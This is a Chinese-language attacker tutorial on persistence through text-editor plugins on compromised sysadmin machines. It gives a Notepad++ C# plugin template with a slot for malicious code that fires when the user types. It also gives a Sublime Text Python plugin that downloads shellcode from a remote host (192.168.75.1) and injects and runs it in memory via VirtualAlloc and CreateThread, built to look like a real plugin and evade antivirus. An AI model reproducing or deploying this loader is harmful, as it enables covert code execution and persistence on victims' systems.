## 1.前言

 因为某些原因，经常能钓到运维人员的机器，也能经常碰到各种各样的文本编辑器，就比如Notepad++，Sublime Text 等这些是非常常见的，那么我们能否利用这些搞点事情，弄个持久化，那岂不是美美的。

## 2.Notepad++ 持久化

 这里的原理是这样的，Notepad++ 允许用户下载和安装的插件，可以在本地安装自定义插件，只需要把相关dll 放在%PROGRAMFILES%\\Notepad++\\plugins\\pluginName\\ 目录下，就能直接加载dll，且没有任何提示交互，这很隐蔽，缺点就是这个目录需要管理员权限才能写文件。

 那个插件dll模版如下：

```
static bool firstRun = true;//确保只运行一次的标志位
public static void OnNotification(ScNotification notification)
{
    if (notification.Header.Code == (uint)SciMsg.SCI\_ADDTEXT && firstRun)
    {
        //恶意代码填充的位置
        firstRun = !firstRun;
    }
}
```

在`SCI_ADDTEXT`使用了通知类型，每次用户键入字符时都会触发我们的恶意代码，但因为我们的标识位的缘故，恶意代码只会运行一次，也可以用其他通知类型，实际上有数百种通知类型可供使用。

测试是否可行，我这里弹框试试：

```
static bool firstRun = true;
public static void OnNotification(ScNotification notification)
{
    if (notification.Header.Code == (uint)SciMsg.SCI\_ADDTEXT && firstRun)
    {
        MessageBox.Show("Hello hacker！");
        firstRun = !firstRun;
    }
}
```

生成dll，放在插件目录下，如果没有插件目录，可自行创建，将dll copy到插件目录下。

为了构建插件dll，必须用模版，我这里用c#的模版

github链接：https://github.com/kbilsted/NotepadPlusPlusPluginPack.Net，这里直接随便找个插件把代码填充进去就行,但是注意，notepad++的插件模版在低版本在高版本完全不适用了，因为模版变了。

## 2.Sublime Text 持久化

Sublime Text 通过用 Python 编写的插件支持可扩展性，由于 Sublime 插件是用 Python 编写的，因此使用它们来执行其他程序非常简单。只需在 Sublime 的插件目录 ( `C:\Users\USER\AppData\Roaming\Sublime Text\Packages\`) 中放置一个 Python 脚本就可以了，需要管理员权限。

![](../Images/be7f73ffac4e3865b23c0ecd4e405711.png)

这里可以直接把py脚本替换成python的shellcode加载器，但是这样太简陋，且太容易被杀软给查杀了，所以我们需要做一个真正的插件！

打开 Sublime 并点击，Ctrl + Shift + F 然后键入`Install Package Control`并按`Enter`。然后我们需要在 Sublime Text 的包目录 ( `C:\Users\USER\AppData\Roaming\Sublime Text 3\Packages\`) 中创建一个文件夹来保存我们的插件脚本和它可能需要的任何支持库，生成的插件包文件将使用文件夹的名称。

安装Install Package Control可以参考https://packagecontrol.io/installation

```
import ctypes
import sys
import os.path
\# 这里利用的Sublime Text 自带的request库文件，所以我们需要把库文件拷贝到Sublime Text目录下
sys.path.insert(0, os.path.dirname(os.path.abspath(\_\_file\_\_)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(\_\_file\_\_)), "lib"))
import requests
\# Download shellcode
url = 'http://192.168.75.1/shellcode'
r = requests.get(url, stream=True, verify=False)
scbytes = r.content
\# Inject shellcode
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c\_void\_p
space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c\_int(0),ctypes.c\_int(len(scbytes)),ctypes.c\_int(0x3000),ctypes.c\_int(0x40))
buff = ( ctypes.c\_char \* len(scbytes) ).from\_buffer\_copy( scbytes )
ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c\_void\_p, ctypes.c\_void\_p, ctypes.c\_size\_t ) 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c\_void\_p(space),buff,ctypes.c\_int(len(scbytes)))
ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c\_int, ctypes.c\_int, ctypes.c\_void\_p, ctypes.c\_int, ctypes.c\_int, ctypes.POINTER(ctypes.c\_int) ) 
handle = ctypes.windll.kernel32.CreateThread(ctypes.c\_int(0),ctypes.c\_int(0),ctypes.c\_void\_p(space),ctypes.c\_int(0),ctypes.c\_int(0),ctypes.pointer(ctypes.c\_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
```
